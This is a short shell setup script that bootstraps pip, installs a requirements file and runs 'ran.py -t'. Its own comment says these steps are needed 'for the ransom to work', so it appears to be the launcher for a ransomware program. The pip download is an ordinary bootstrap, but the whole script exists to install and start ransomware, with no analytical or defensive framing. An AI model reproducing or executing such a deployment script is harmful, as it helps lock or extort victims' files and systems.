# Download packages and pip for the ransom to work
curl "https://bootstrap.pypa.io/get-pip.py" -o get-pip.py
python get-pip.py
pip install -r requirements.txt
python ran.py -t